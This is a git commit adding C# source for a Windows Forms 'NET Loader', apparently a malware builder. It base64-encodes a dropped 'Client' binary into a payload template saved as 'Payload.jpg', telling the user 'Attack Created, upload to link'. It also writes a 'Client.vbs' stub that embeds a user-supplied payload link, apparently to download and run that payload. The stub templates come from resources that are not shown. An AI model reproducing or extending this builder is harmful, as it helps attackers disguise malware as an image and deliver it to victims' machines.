3eb1c7491ed14e2b9533f6104efe0b7a21984343
Sora <45709238+sorabug@users.noreply.github.com>
2023-03-10 21:46:53 +0800

    Add files via upload

---
+++ loader/Form1.Designer.cs
@@ -0,0 +1,177 @@
+﻿namespace loader
+{
+	public partial class Form1 : global::System.Windows.Forms.Form
+	{
+		protected override void Dispose(bool disposing)
+		{
+			bool flag = disposing && this.components != null;
+			if (flag)
+			{
+				this.components.Dispose();
+			}
+			base.Dispose(disposing);
+		}
+
+		private void InitializeComponent()
+		{
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.tabControl1 = new System.Windows.Forms.TabControl();
+            this.Loader = new System.Windows.Forms.TabPage();
+            this.label2 = new System.Windows.Forms.Label();
+            this.button1 = new System.Windows.Forms.Button();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.button2 = new System.Windows.Forms.Button();
+            this.label1 = new System.Windows.Forms.Label();
+            this.panel1 = new System.Windows.Forms.Panel();
+            this.tabControl1.SuspendLayout();
+            this.Loader.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // tabControl1
+            // 
+            this.tabControl1.Controls.Add(this.Loader);
+            this.tabControl1.Location = new System.Drawing.Point(-13, -2);
+            this.tabControl1.Margin = new System.Windows.Forms.Padding(6);
+            this.tabControl1.Name = "tabControl1";
+            this.tabControl1.SelectedIndex = 0;
+            this.tabControl1.Size = new System.Drawing.Size(1016, 582);
+            this.tabControl1.TabIndex = 0;
+            // 
+            // Loader
+            // 
+            this.Loader.BackColor = System.Drawing.Color.Transparent;
+            this.Loader.Controls.Add(this.label2);
+            this.Loader.Controls.Add(this.button1);
+            this.Loader.Controls.Add(this.textBox1);
+            this.Loader.Controls.Add(this.button2);
+            this.Loader.Controls.Add(this.label1);
+            this.Loader.Controls.Add(this.panel1);
+            this.Loader.Location = new System.Drawing.Point(4, 33);
+            this.Loader.Margin = new System.Windows.Forms.Padding(6);
+            this.Loader.Name = "Loader";
+            this.Loader.Padding = new System.Windows.Forms.Padding(6);
+            this.Loader.Size = new System.Drawing.Size(1008, 545);
+            this.Loader.TabIndex = 0;
+            this.Loader.Text = " Loader";
+            this.Loader.Click += new System.EventHandler(this.Loader_Click);
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label2.ForeColor = System.Drawing.Color.Black;
+            this.label2.Location = new System.Drawing.Point(33, 302);
+            this.label2.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(148, 25);
+            this.label2.TabIndex = 5;
+            this.label2.Text = "Payload Link";
+            // 
+            // button1
+            // 
+            this.button1.BackColor = System.Drawing.Color.Snow;
+            this.button1.ForeColor = System.Drawing.Color.Black;
+            this.button1.Location = new System.Drawing.Point(204, 384);
+            this.button1.Margin = new System.Windows.Forms.Padding(6);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(222, 42);
+            this.button1.TabIndex = 1;
+            this.button1.Text = "Encrypt";
+            this.button1.UseVisualStyleBackColor = false;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // textBox1
+            // 
+            this.textBox1.BackColor = System.Drawing.Color.White;
+            this.textBox1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
+            this.textBox1.ForeColor = System.Drawing.Color.Black;
+            this.textBox1.Location = new System.Drawing.Point(204, 298);
+            this.textBox1.Margin = new System.Windows.Forms.Padding(6);
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(594, 29);
+            this.textBox1.TabIndex = 2;
+            this.textBox1.TextChanged += new System.EventHandler(this.textBox1_TextChanged);
+            // 
+            // button2
+            // 
+            this.button2.BackColor = System.Drawing.Color.Snow;
+            this.button2.ForeColor = System.Drawing.Color.Black;
+            this.button2.Location = new System.Drawing.Point(204, 218);
+            this.button2.Margin = new System.Windows.Forms.Padding(6);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(222, 50);
+            this.button2.TabIndex = 4;
+            this.button2.Text = "Generate Payload";
+            this.button2.UseVisualStyleBackColor = false;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label1.ForeColor = System.Drawing.Color.Black;
+            this.label1.Location = new System.Drawing.Point(108, 308);
+            this.label1.Margin = new System.Windows.Forms.Padding(6, 0, 6, 0);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(0, 25);
+            this.label1.TabIndex = 3;
+            this.label1.Click += new System.EventHandler(this.label1_Click);
+            // 
+            // panel1
+            // 
+            this.panel1.AllowDrop = true;
+            this.panel1.BackColor = System.Drawing.Color.Transparent;
+            this.panel1.BackgroundImage = global::loader.Properties.Resources.rfgdhfgh1;
+            this.panel1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
+            this.panel1.ForeColor = System.Drawing.Color.White;
+            this.panel1.Location = new System.Drawing.Point(204, 34);
+            this.panel1.Margin = new System.Windows.Forms.Padding(6);
+            this.panel1.Name = "panel1";
+            this.panel1.Size = new System.Drawing.Size(657, 134);
+            this.panel1.TabIndex = 0;
+            this.panel1.DragDrop += new System.Windows.Forms.DragEventHandler(this.panel1_DragDrop);
+            this.panel1.DragEnter += new System.Windows.Forms.DragEventHandler(this.panel1_DragEnter);
+            this.panel1.Paint += new System.Windows.Forms.PaintEventHandler(this.panel1_Paint);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(11F, 24F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.Color.White;
+            this.ClientSize = new System.Drawing.Size(994, 566);
+            this.Controls.Add(this.tabControl1);
+            this.ForeColor = System.Drawing.Color.WhiteSmoke;
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.Margin = new System.Windows.Forms.Padding(6);
+            this.MaximizeBox = false;
+            this.Name = "Form1";
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "NET Loader";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.tabControl1.ResumeLayout(false);
+            this.Loader.ResumeLayout(false);
+            this.Loader.PerformLayout();
+            this.ResumeLayout(false);
+
+		}
+
+		private global::System.ComponentModel.IContainer components = null;
+
+		private global::System.Windows.Forms.TabControl tabControl1;
+
+		private global::System.Windows.Forms.TabPage Loader;
+
+		private global::System.Windows.Forms.Label label2;
+
+		private global::System.Windows.Forms.Button button1;
+
+		private global::System.Windows.Forms.TextBox textBox1;
+
+		private global::System.Windows.Forms.Button button2;
+
+		private global::System.Windows.Forms.Label label1;
+
+		private global::System.Windows.Forms.Panel panel1;
+	}
+}
---
+++ loader/Form1.cs
@@ -0,0 +1,169 @@
+﻿using System;
+using System.ComponentModel;
+using System.Drawing;
+using System.IO;
+using System.IO.Compression;
+using System.Linq;
+using System.Windows.Forms;
+using loader.Properties;
+
+namespace loader
+{
+
+	public partial class Form1 : Form
+	{
+
+		public Form1()
+		{
+			this.InitializeComponent();
+		}
+
+
+		private void panel1_DragEnter(object sender, DragEventArgs e)
+		{
+			e.Effect = DragDropEffects.All;
+		}
+
+
+		private void panel1_DragDrop(object sender, DragEventArgs e)
+		{
+			this.file = (string[])e.Data.GetData(DataFormats.FileDrop, false);
+		}
+
+
+		private void button1_Click(object sender, EventArgs e)
+		{
+			bool flag = this.textBox1.Text.Length == 0;
+			if (flag)
+			{
+				MessageBox.Show(this, "Enter Payload Link !", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
+			}
+			else
+			{
+				using (StreamWriter streamWriter = new StreamWriter("Client.vbs", true))
+				{
+					streamWriter.WriteLine(Resources.stub_N.Replace("LINK", this.textBox1.Text));
+				}
+				MessageBox.Show("VBS Created..!");
+			}
+		}
+
+
+		private void textBox1_TextChanged(object sender, EventArgs e)
+		{
+		}
+
+		private void label1_Click(object sender, EventArgs e)
+		{
+		}
+
+		private void Form1_Load(object sender, EventArgs e)
+		{
+		}
+
+		private void button2_Click(object sender, EventArgs e)
+		{
+			int length = this.file[0].Length;
+			bool flag = length == 0;
+			if (flag)
+			{
+				MessageBox.Show(this, "Make sure you dropped your Client ", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
+			}
+			else
+			{
+				byte[] inArray = File.ReadAllBytes(this.file[0]);
+				string text = Form1.Randomchar(2);
+				string newValue = Convert.ToBase64String(inArray).Remove(0, 2);
+				string text2 = Console.ReadLine();
+				string value = Resources.RunP.Replace("CLIENT", newValue);
+				using (StreamWriter streamWriter = new StreamWriter("Payload.jpg"))
+				{
+					streamWriter.WriteLine(value);
+				}
+				MessageBox.Show("Attack Created, upload to link and Continue");
+			}
+		}
+
+		public static string Randomchar(int length)
+		{
+			return new string((from s in Enumerable.Repeat<string>("!@#%^&*()><.|", length)
+			select s[Form1.random.Next(s.Length)]).ToArray<char>());
+		}
+
+		public static string ReverseString(string s)
+		{
+			char[] array = s.ToCharArray();
+			Array.Reverse(array);
+			return new string(array);
+		}
+
+		private static byte[] Compress(byte[] data)
+		{
+			byte[] result;
+			using (MemoryStream memoryStream = new MemoryStream())
+			{
+				using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Compress))
+				{
+					gzipStream.Write(data, 0, data.Length);
+					gzipStream.Close();
+					result = memoryStream.ToArray();
+				}
+			}
+			return result;
+		}
+
+		public static string RandomString(int length)
+		{
+			return new string((from s in Enumerable.Repeat<string>("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", length)
+			select s[Form1.random.Next(s.Length)]).ToArray<char>());
+		}
+
+		private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
+		{
+		}
+
+
+
+		private void panel1_Paint(object sender, PaintEventArgs e)
+		{
+		}
+
+		private void label3_Click(object sender, EventArgs e)
+		{
+		}
+
+		private void textBox2_TextChanged(object sender, EventArgs e)
+		{
+		}
+
+		private void label4_Click(object sender, EventArgs e)
+		{
+		}
+
+		private void comboBox2_SelectedIndexChanged(object sender, EventArgs e)
+		{
+		}
+
+		private void label5_Click(object sender, EventArgs e)
+		{
+		}
+
+		private void label2_Click(object sender, EventArgs e)
+		{
+		}
+
+		public string[] file = new string[]
+		{
+			""
+		};
+
+		public string LINK;
+
+		private static Random random = new Random();
+
+        private void Loader_Click(object sender, EventArgs e)
+        {
+
+        }
+    }
+}
